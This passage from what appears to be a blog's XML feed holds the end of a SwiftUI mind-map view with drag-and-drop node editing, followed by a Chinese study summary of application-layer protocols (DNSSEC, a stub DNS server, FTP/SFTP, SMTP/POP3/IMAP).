class="hljs-comment">*/</span><br><br><span class="hljs-comment">// End of file</span><br><br><span class="hljs-keyword">import</span> Combine<br><span class="hljs-keyword">import</span> SwiftUI<br><span class="hljs-keyword">import</span> UniformTypeIdentifiers<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">EnhancedMindMapView</span>: <span class="hljs-title class_ inherited__">View</span> &#123;<br>    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> db <span class="hljs-operator">=</span> <span class="hljs-type">SQLiteMindMap</span>.shared<br>    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> editingNode: <span class="hljs-type">MindMapNode</span>?<br>    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> showAddNodeSheet <span class="hljs-operator">=</span> <span class="hljs-literal">false</span><br>    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> draggedNode: <span class="hljs-type">MindMapNode</span>?<br>    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> dropTargetNode: <span class="hljs-type">MindMapNode</span>?<br><br>    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> &#123;<br>        <span class="hljs-type">NavigationView</span> &#123;<br>            <span class="hljs-type">ScrollView</span> &#123;<br>                <span class="hljs-type">VStack</span>(alignment: .leading, spacing: <span class="hljs-number">4</span>) &#123;<br>                    <span class="hljs-type">ForEach</span>(db.tree) &#123; root <span class="hljs-keyword">in</span><br>                        <span class="hljs-type">EnhancedTreeNodeView</span>(tree: root, draggedNode: <span class="hljs-variable">$draggedNode</span>, dropTargetNode: <span class="hljs-variable">$dropTargetNode</span>, onEdit: editNode, onDelete: deleteNode, onAddChild: addChildNode)<br>                    &#125;<br>                &#125;<br>                .padding()<br>            &#125;<br>            .navigationTitle(<span class="hljs-string">&quot;Mind Map&quot;</span>)<br>            .toolbar &#123;<br>                <span class="hljs-type">ToolbarItem</span>(placement: .navigationBarTrailing) &#123;<br>                    <span class="hljs-type">Button</span>(action: &#123; showAddNodeSheet <span class="hljs-operator">=</span> <span class="hljs-literal">true</span> &#125;) &#123;<br>                        <span class="hljs-type">Image</span>(systemName: <span class="hljs-string">&quot;plus&quot;</span>)<br>                    &#125;<br>                &#125;<br>            &#125;<br>            .sheet(isPresented: <span class="hljs-variable">$showAddNodeSheet</span>) &#123;<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> parent <span class="hljs-operator">=</span> dropTargetNode &#123;<br>                    <span class="hljs-type">NodeEditView</span>(node: <span class="hljs-type">MindMapNode</span>(parentId: parent.id, title: <span class="hljs-string">&quot;&quot;</span>)) &#123; newNode <span class="hljs-keyword">in</span><br>                        <span class="hljs-type">Task</span> &#123; <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> db.insertNode(newNode) &#125;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-type">NodeEditView</span>(node: <span class="hljs-type">MindMapNode</span>(title: <span class="hljs-string">&quot;&quot;</span>)) &#123; newNode <span class="hljs-keyword">in</span><br>                        <span class="hljs-type">Task</span> &#123; <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> db.insertNode(newNode) &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">editNode</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">node</span>: <span class="hljs-type">MindMapNode</span>) &#123;<br>        editingNode <span class="hljs-operator">=</span> node<br>        showAddNodeSheet <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><br>    &#125;<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">deleteNode</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">node</span>: <span class="hljs-type">MindMapNode</span>) &#123;<br>        <span class="hljs-type">Task</span> &#123; <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> db.deleteNode(id: node.id) &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">addChildNode</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">parent</span>: <span class="hljs-type">MindMapNode</span>) &#123;<br>        dropTargetNode <span class="hljs-operator">=</span> parent<br>        showAddNodeSheet <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">EnhancedTreeNodeView</span>: <span class="hljs-title class_ inherited__">View</span> &#123;<br>    <span class="hljs-keyword">var</span> tree: <span class="hljs-type">MindMapTree</span><br>    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> draggedNode: <span class="hljs-type">MindMapNode</span>?<br>    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> dropTargetNode: <span class="hljs-type">MindMapNode</span>?<br>    <span class="hljs-keyword">var</span> onEdit: (<span class="hljs-type">MindMapNode</span>) -&gt; <span class="hljs-type">Void</span><br>    <span class="hljs-keyword">var</span> onDelete: (<span class="hljs-type">MindMapNode</span>) -&gt; <span class="hljs-type">Void</span><br>    <span class="hljs-keyword">var</span> onAddChild: (<span class="hljs-type">MindMapNode</span>) -&gt; <span class="hljs-type">Void</span><br><br>    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> &#123;<br>        <span class="hljs-type">VStack</span>(alignment: .leading, spacing: <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-type">HStack</span> &#123;<br>                <span class="hljs-type">Text</span>(tree.node.title)<br>                    .padding(<span class="hljs-number">4</span>)<br>                    .background(dropTargetNode<span class="hljs-operator">?</span>.id <span class="hljs-operator">==</span> tree.node.id <span class="hljs-operator">?</span> <span class="hljs-type">Color</span>.blue.opacity(<span class="hljs-number">0.3</span>) : <span class="hljs-type">Color</span>.clear)<br>                    .cornerRadius(<span class="hljs-number">6</span>)<br>                <span class="hljs-type">Spacer</span>()<br>                <span class="hljs-type">Menu</span> &#123;<br>                    <span class="hljs-type">Button</span>(<span class="hljs-string">&quot;Add Child&quot;</span>) &#123; onAddChild(tree.node) &#125;<br>                    <span class="hljs-type">Button</span>(<span class="hljs-string">&quot;Edit&quot;</span>) &#123; onEdit(tree.node) &#125;<br>                    <span class="hljs-type">Button</span>(<span class="hljs-string">&quot;Delete&quot;</span>) &#123; onDelete(tree.node) &#125;<br>                &#125; label: &#123;<br>                    <span class="hljs-type">Image</span>(systemName: <span class="hljs-string">&quot;ellipsis.circle&quot;</span>)<br>                        .imageScale(.large)<br>                &#125;<br>            &#125;<br>            .onDrag &#123;<br>                draggedNode <span class="hljs-operator">=</span> tree.node<br>                <span class="hljs-keyword">return</span> <span class="hljs-type">NSItemProvider</span>(object: tree.node.id <span class="hljs-keyword">as</span> <span class="hljs-type">NSString</span>)<br>            &#125;<br>            .onDrop(of: [<span class="hljs-type">UTType</span>.text], delegate: <span class="hljs-type">DropViewDelegate</span>(targetNode: tree.node, draggedNode: <span class="hljs-variable">$draggedNode</span>, dropTargetNode: <span class="hljs-variable">$dropTargetNode</span>))<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span>tree.children.isEmpty &#123;<br>                <span class="hljs-type">VStack</span>(alignment: .leading, spacing: <span class="hljs-number">2</span>) &#123;<br>                    <span class="hljs-type">ForEach</span>(tree.children) &#123; child <span class="hljs-keyword">in</span><br>                        <span class="hljs-type">EnhancedTreeNodeView</span>(tree: child, draggedNode: <span class="hljs-variable">$draggedNode</span>, dropTargetNode: <span class="hljs-variable">$dropTargetNode</span>, onEdit: onEdit, onDelete: onDelete, onAddChild: onAddChild)<br>                            .padding(.leading, <span class="hljs-number">16</span>)<br>                            .animation(.default, value: child.node.id)<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">DropViewDelegate</span>: <span class="hljs-title class_ inherited__">DropDelegate</span> &#123;<br>    <span class="hljs-keyword">let</span> targetNode: <span class="hljs-type">MindMapNode</span><br>    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> draggedNode: <span class="hljs-type">MindMapNode</span>?<br>    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> dropTargetNode: <span class="hljs-type">MindMapNode</span>?<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">validateDrop</span>(<span class="hljs-params">info</span>: <span class="hljs-type">DropInfo</span>) -&gt; <span class="hljs-type">Bool</span> &#123;<br>        <span class="hljs-keyword">return</span> draggedNode <span class="hljs-operator">!=</span> <span class="hljs-literal">nil</span> <span class="hljs-operator">&amp;&amp;</span> draggedNode<span class="hljs-operator">?</span>.id <span class="hljs-operator">!=</span> targetNode.id<br>    &#125;<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">dropEntered</span>(<span class="hljs-params">info</span>: <span class="hljs-type">DropInfo</span>) &#123;<br>        dropTargetNode <span class="hljs-operator">=</span> targetNode<br>    &#125;<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">performDrop</span>(<span class="hljs-params">info</span>: <span class="hljs-type">DropInfo</span>) -&gt; <span class="hljs-type">Bool</span> &#123;<br>        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> dragged <span class="hljs-operator">=</span> draggedNode <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> &#125;<br>        <span class="hljs-type">Task</span> &#123;<br>            <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> <span class="hljs-type">SQLiteMindMap</span>.shared.updateNodeParent(id: dragged.id, newParentId: targetNode.id, position: <span class="hljs-number">0</span>)<br>        &#125;<br>        draggedNode <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span><br>        dropTargetNode <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">NodeEditView</span>: <span class="hljs-title class_ inherited__">View</span> &#123;<br>    <span class="hljs-meta">@Environment</span>(\.dismiss) <span class="hljs-keyword">var</span> dismiss<br>    <span class="hljs-meta">@State</span> <span class="hljs-keyword">var</span> node: <span class="hljs-type">MindMapNode</span><br>    <span class="hljs-keyword">var</span> onSave: (<span class="hljs-type">MindMapNode</span>) -&gt; <span class="hljs-type">Void</span><br><br>    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> &#123;<br>        <span class="hljs-type">NavigationView</span> &#123;<br>            <span class="hljs-type">Form</span> &#123;<br>                <span class="hljs-type">TextField</span>(<span class="hljs-string">&quot;Title&quot;</span>, text: <span class="hljs-variable">$node</span>.title)<br>                <span class="hljs-type">TextField</span>(<span class="hljs-string">&quot;Content&quot;</span>, text: <span class="hljs-type">Binding</span>(<br>                    get: &#123; node.content <span class="hljs-operator">??</span> <span class="hljs-string">&quot;&quot;</span> &#125;,<br>                    set: &#123; node.content <span class="hljs-operator">=</span> <span class="hljs-variable">$0</span> &#125;<br>                ))<br>                <span class="hljs-type">ColorPicker</span>(<span class="hljs-string">&quot;Color&quot;</span>, selection: <span class="hljs-type">Binding</span>(<br>                    get: &#123; <span class="hljs-type">Color</span>(node.color <span class="hljs-operator">??</span> <span class="hljs-string">&quot;#FFFFFF&quot;</span>) &#125;,<br>                    set: &#123; node.color <span class="hljs-operator">=</span> <span class="hljs-variable">$0</span>.toHex() &#125;<br>                ))<br>            &#125;<br>            .navigationTitle(node.title.isEmpty <span class="hljs-operator">?</span> <span class="hljs-string">&quot;New Node&quot;</span> : <span class="hljs-string">&quot;Edit Node&quot;</span>)<br>            .toolbar &#123;<br>                <span class="hljs-type">ToolbarItem</span>(placement: .confirmationAction) &#123;<br>                    <span class="hljs-type">Button</span>(<span class="hljs-string">&quot;Save&quot;</span>) &#123;<br>                        onSave(node)<br>                        dismiss()<br>                    &#125;<br>                &#125;<br>                <span class="hljs-type">ToolbarItem</span>(placement: .cancellationAction) &#123;<br>                    <span class="hljs-type">Button</span>(<span class="hljs-string">&quot;Cancel&quot;</span>) &#123; dismiss() &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Color extension for hex conversion</span><br><span class="hljs-keyword">extension</span> <span class="hljs-title class_">Color</span> &#123;<br>    <span class="hljs-keyword">init</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">hex</span>: <span class="hljs-type">String</span>) &#123;<br>        <span class="hljs-keyword">let</span> hex <span class="hljs-operator">=</span> hex.trimmingCharacters(in: <span class="hljs-type">CharacterSet</span>.alphanumerics.inverted)<br>        <span class="hljs-keyword">var</span> int: <span class="hljs-type">UInt64</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>        <span class="hljs-type">Scanner</span>(string: hex).scanHexInt64(<span class="hljs-operator">&amp;</span>int)<br>        <span class="hljs-keyword">let</span> r, g, b: <span class="hljs-type">UInt64</span><br>        (r, g, b) <span class="hljs-operator">=</span> ((int <span class="hljs-operator">&gt;&gt;</span> <span class="hljs-number">16</span>) <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF</span>, (int <span class="hljs-operator">&gt;&gt;</span> <span class="hljs-number">8</span>) <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF</span>, int <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">self</span>.<span class="hljs-keyword">init</span>(red: <span class="hljs-type">Double</span>(r)<span class="hljs-regexp">/255, green: Double(g)/</span><span class="hljs-number">255</span>, blue: <span class="hljs-type">Double</span>(b)<span class="hljs-operator">/</span><span class="hljs-number">255</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">toHex</span>() -&gt; <span class="hljs-type">String</span> &#123;<br>        <span class="hljs-keyword">let</span> uiColor <span class="hljs-operator">=</span> <span class="hljs-type">UIColor</span>(<span class="hljs-keyword">self</span>)<br>        <span class="hljs-keyword">var</span> r: <span class="hljs-type">CGFloat</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, g: <span class="hljs-type">CGFloat</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, b: <span class="hljs-type">CGFloat</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, a: <span class="hljs-type">CGFloat</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>        uiColor.getRed(<span class="hljs-operator">&amp;</span>r, green: <span class="hljs-operator">&amp;</span>g, blue: <span class="hljs-operator">&amp;</span>b, alpha: <span class="hljs-operator">&amp;</span>a)<br>        <span class="hljs-keyword">return</span> <span class="hljs-type">String</span>(format: <span class="hljs-string">&quot;%02X%02X%02X&quot;</span>, <span class="hljs-type">Int</span>(r<span class="hljs-operator">*</span><span class="hljs-number">255</span>), <span class="hljs-type">Int</span>(g<span class="hljs-operator">*</span><span class="hljs-number">255</span>), <span class="hljs-type">Int</span>(b<span class="hljs-operator">*</span><span class="hljs-number">255</span>))<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Swift</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Swift, MindMap,</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>六周后续内容总结</title>
    <link href="/2025/11/10/%E5%85%AD%E5%91%A8%E5%90%8E%E7%BB%AD%E5%86%85%E5%AE%B9%E6%80%BB%E7%BB%93/"/>
    <url>/2025/11/10/%E5%85%AD%E5%91%A8%E5%90%8E%E7%BB%AD%E5%86%85%E5%AE%B9%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="Day-36-40-第六周后续内容总结"><a href="#Day-36-40-第六周后续内容总结" class="headerlink" title="Day 36-40: 第六周后续内容总结"></a>Day 36-40: 第六周后续内容总结</h1><h2 id="Day-36-DNS安全（DNSSEC）"><a href="#Day-36-DNS安全（DNSSEC）" class="headerlink" title="Day 36: DNS安全（DNSSEC）"></a>Day 36: DNS安全（DNSSEC）</h2><p><strong>核心内容</strong>：</p><ul><li>DNS安全威胁（缓存投毒、劫持）</li><li>DNSSEC原理</li><li>数字签名验证</li><li>DNS over HTTPS (DoH)</li><li>DNS over TLS (DoT)</li></ul><p><strong>关键知识点</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">DNS安全威胁：<br><span class="hljs-bullet">- </span>缓存投毒：攻击者注入虚假DNS记录<br><span class="hljs-bullet">- </span>DNS劫持：重定向到恶意网站<br><span class="hljs-bullet">- </span>中间人攻击：窃听DNS查询<br><br>DNSSEC防护：<br><span class="hljs-bullet">- </span>数字签名：验证DNS记录真实性<br><span class="hljs-bullet">- </span>信任链：从根到叶的验证链<br><span class="hljs-bullet">- </span>记录类型：RRSIG, DNSKEY, DS, NSEC<br></code></pre></td></tr></table></figure><hr><h2 id="Day-37-实战-DNS服务器实现"><a href="#Day-37-实战-DNS服务器实现" class="headerlink" title="Day 37: 实战 - DNS服务器实现"></a>Day 37: 实战 - DNS服务器实现</h2><p><strong>核心内容</strong>：</p><ul><li>实现简单的DNS服务器</li><li>处理DNS查询请求</li><li>返回DNS响应</li><li>本地DNS缓存</li></ul><p><strong>项目功能</strong>：</p><ul><li>接收UDP DNS查询</li><li>解析查询报文</li><li>查找本地记录</li><li>构造并返回响应</li><li>支持A、AAAA、CNAME记录</li></ul><p><strong>代码框架</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleDNSServer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, port=<span class="hljs-number">53</span></span>):<br>        <span class="hljs-variable language_">self</span>.records = &#123;&#125;<br>        <span class="hljs-variable language_">self</span>.cache = &#123;&#125;<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_record</span>(<span class="hljs-params">self, domain, rtype, rdata</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;添加DNS记录&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_query</span>(<span class="hljs-params">self, query_data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;处理DNS查询&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_response</span>(<span class="hljs-params">self, query, answers</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;构造DNS响应&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;启动DNS服务器&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><hr><h2 id="Day-38-FTP-SFTP协议"><a href="#Day-38-FTP-SFTP协议" class="headerlink" title="Day 38: FTP&#x2F;SFTP协议"></a>Day 38: FTP&#x2F;SFTP协议</h2><p><strong>核心内容</strong>：</p><ul><li>FTP协议原理</li><li>主动模式 vs 被动模式</li><li>SFTP（SSH文件传输）</li><li>文件传输实现</li></ul><p><strong>FTP工作模式</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">主动模式（PORT）：<br>客户端 → 控制连接（21端口）→ 服务器<br>服务器 → 数据连接（20端口）→ 客户端<br><br>被动模式（PASV）：<br>客户端 → 控制连接（21端口）→ 服务器<br>客户端 → 数据连接（动态端口）→ 服务器<br><br>SFTP：<br><span class="hljs-bullet">- </span>基于SSH（22端口）<br><span class="hljs-bullet">- </span>加密传输<br><span class="hljs-bullet">- </span>更安全<br></code></pre></td></tr></table></figure><hr><h2 id="Day-39-SMTP-POP3-IMAP邮件协议"><a href="#Day-39-SMTP-POP3-IMAP邮件协议" class="headerlink" title="Day 39: SMTP&#x2F;POP3&#x2F;IMAP邮件协议"></a>Day 39: SMTP&#x2F;POP3&#x2F;IMAP邮件协议</h2><p><strong>核心内容</strong>：</p><ul><li>SMTP发送邮件</li><li>POP3接收邮件</li><li>IMAP邮件管理</li><li>邮件格式（MIME）</li></ul><p><strong>协议对比</strong>：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌──────────┬──────┬────────────┬──────────┐<br>│ 协议     │ 端口 │ 用途       │ 特点     │<br>├──────────┼──────┼────────────┼──────────┤<br>│ SMTP     │<span class="hljs-number"> 25 </span>  │ 发送邮件   │ 推送协议 │<br>│ POP3     │<span class="hljs-number"> 110 </span> │ 接收邮件   │ 下载删除 │<br>│ IMAP     │<span class="hljs-number"> 143 </span> │ 管理邮件   │ 服务器存 │<br>└──────────┴──────┴────────────┴──────────┘<br><br>SMTP流程：<br>客户端 → SMTP服务器 → 收件服务器 → 收件人<br><br>POP3 vs IMAP：<br>POP3: 下载到本地，服务器删除<br>IMAP: 邮件保留在服务器，支持多设备同步<br></code></pre></td></tr></table></figure><p><strong>代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># SMTP发送邮件</span><br><span class="hljs-keyword">import</span> smtplib<br><span class="hljs-keyword">from</span> email.mime.text <span class="hljs-keyword">import</span> MIMEText<br><br>msg = MIMEText(<span class="hljs-string">&#x27;邮件内容&#x27;</span>)<br>msg[<span class="hljs-string">&#x27;Subject&#x27;</span>] = <span class="hljs-string">&#x27;主题&#x27;</span><br>msg[<span class="hljs-string">&#x27;From&#x27;</span>] = <span class="hljs-string">&#x27;sender@example.com&#x27;</span><br>msg[<span class="hljs-string">&#x27;To&#x27;</span>] = <span class="hljs-string">&#x27;receiver@example.com&#x27;</span><br><br>smtp = smtplib.SMTP(<span class="hljs-string">&#x27;smtp.example.com&#x27;</span>, <span class="hljs-number">25</span>)<br>smtp.send_message(msg)<br>smtp.quit()<br></code></pre></td></tr></table></figure><hr><h2 id="Day-40-应用层协议总结"><a href="#Day-40-应用层协议总结" class="headerlink" title="Day 40: 应用层协议总结"></a>Day 40: 应用层协议总结</h2><h3 id="学过的应用层协议总结"><a href="#学过的应用层协议总结" class="headerlink" title="学过的应用层协议总结"></a>学过的应用层协议总结</h3><p><strong>HTTP家族</strong>：</p><ul><li>HTTP&#x2F;1.1: 传统Web协议</li><li>HTTP&#x2F;2: 二进制分帧、多路复用</li><li>HTTP&#x2F;3: 基于QUIC，0-RTT连接</li><li>HTTPS: TLS加密的HTTP</li><li>WebSocket: 全双工实时通信</li></ul><p><strong>DNS</strong>：</p><ul><li>域名解析</li><li>递归查询 vs 迭代查询</li><li>DNS缓存</li><li>DNSSEC安全</li></ul><p><strong>邮件协议</strong>：</p><ul><li>SMTP: 发送邮件（25, 587）</li><li>POP3: 接收邮件（110, 995）</li><li>IMAP: 管理邮件（143, 993）</li></ul><p><strong>文件传输</strong>：</p><ul><li>FTP: 文件传输（20, 21）</li><li>SFTP: 安全文件传输（22）</li></ul><p><strong>其他</strong>：</p><ul><li>DHCP: 自动配置IP（67, 68）</li><li>SSH: 安全远程登录（22）</li><li>Telnet: 远程登录（23）</li></ul><h3 id="应用层协议设计模式"><a href="#应用层协议设计模式" class="headerlink" title="应用层协议设计模式"></a>应用层协议设计模式</h3><p><strong>客户端-服务器模型</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">客户端 ←→ 服务器<br><span class="hljs-bullet">- </span>HTTP, FTP, SMTP, DNS<br><span class="hljs-bullet">- </span>服务器提供服务<br><span class="hljs-bullet">- </span>客户端请求服务<br></code></pre></td></tr></table></figure><p><strong>P2P模型</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">对等节点 ←→ 对等节点<br><span class="hljs-bullet">- </span>BitTorrent<br><span class="hljs-bullet">- </span>每个节点既是客户端又是服务器<br></code></pre></td></tr></table></figure><h3 id="协议选择指南"><a href="#协议选择指南" class="headerlink" title="协议选择指南"></a>协议选择指南</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix">场景          → 推荐协议<br>─────────────────────────────<br>网页浏览      → HTTP<span class="hljs-symbol">/HTTPS</span><br>实时通信      → WebSocket<br>文件传输      → FTP<span class="hljs-symbol">/SFTP</span><br>邮件发送      → SMTP<br>邮件接收      → IMAP（推荐）或POP3<br>域名解析      → DNS<br>远程登录      → SSH<br>API设计       → RESTful over HTTP<br></code></pre></td></tr></table></figure><h3 id="性能优化总结"><a href="#性能优化总结" class="headerlink" title="性能优化总结"></a>性能优化总结</h3><p><strong>减少延迟</strong>：</p><ul><li>使用HTTP&#x2F;2或HTTP&#x2F;3</li><li>启用缓存</li><li>使用CDN</li><li>减少往返次数</li></ul><p><strong>提高安全性</strong>：</p><ul><li>使用HTTPS&#x2F;TLS</li><li>启用DNSSEC</li><li>使用SFTP而非FTP</li><li>实施认证和授权</li></ul><p><strong>提升可靠性</strong>：</p><ul><li>实现重试机制</li><li>超时控制</li><li>错误处理</li><li>健康检查</li></ul><hr><h2 id="第六周学习成果"><a href="#第六周学习成果" class="headerlink" title="第六周学习成果"></a>第六周学习成果</h2><h3 id="掌握的技能"><a href="#掌握的技能" class="headerlink" title="掌握的技能"></a>掌握的技能</h3><ul><li>✅ 深入理解DNS工作原理</li><li>✅ 掌握递归和迭代查询</li><li>✅ 了解DNS安全威胁和防护</li><li>✅ 理解邮件协议工作流程</li><li>✅ 掌握文件传输协议</li><li>✅ 能够实现简单的应用层协议</li></ul><h3 id="实战项目"><a href="#实战项目" class="headerlink" title="实战项目"></a>实战项目</h3><ol><li>DNS查询工具</li><li>DNS服务器（简化版）</li><li>FTP客户端</li><li>SMTP邮件发送工具</li></ol><h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix">应用层协议栈：<br><br>应用层<br>├── HTTP<span class="hljs-symbol">/HTTPS</span> (Web)<br>├── DNS (域名解析)<br>├── SMTP<span class="hljs-symbol">/POP3/IMAP</span> (邮件)<br>├── FTP<span class="hljs-symbol">/SFTP</span> (文件传输)<br>└── SSH (远程登录)<br></code></pre></td></tr></table></figure><hr><h2 id="下周预告"><a href="#下周预告" class="headerlink" title="下周预告"></a>下周预告</h2><p><strong>第七周：TCP深入分析（Day 41-47）</strong></p><p>主要内容：</p><ul><li>Day 41: TCP三次握手深入</li><li>Day 42: TCP四次挥手和状态机</li><li>Day 43: TCP流量控制（滑动窗口）</li><li>Day 44: TCP拥塞控制算法</li><li>Day 45: TCP性能优化</li><li>Day 46: 实战：TCP性能测试</li><li>Day 47: 第七周总结</li></ul><p>学习重点：</p><ul><li>深入理解TCP可靠传输机制</li><li>掌握TCP性能优化技巧</li><li>理解拥塞控制算法</li><li>分析TCP性能瓶颈</li></ul><hr><p><strong>进度：40&#x2F;120天（33.3%）</strong></p><p>第六周完成！你已经完成了应用层协议的学习。</p><p>下周我们将深入传输层，学习TCP协议的高级特性！</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
